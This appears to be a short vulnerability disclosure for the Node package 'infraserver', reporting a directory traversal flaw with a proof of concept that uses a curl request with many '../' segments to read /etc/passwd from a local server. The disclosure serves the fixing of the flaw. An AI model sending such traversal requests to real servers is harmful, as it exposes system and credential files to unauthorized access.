# Description

`infraserver` is a data server, this package is vulnerable against Directory Traversal, which may allow access to sensitive files and data on the server.
 For example, requesting the following URL: `/../../etc/passwd` would result in `/etc/passwd` leaking.


# POC

  1. Start the server
    `node server/Infra.data.js`
  2. `curl -v --path-as-is http://127.0.0.1:46372/../../../../../../../../../../../etc/passwd`
  3. `/etc/passwd` from the server will be displayed to the user.
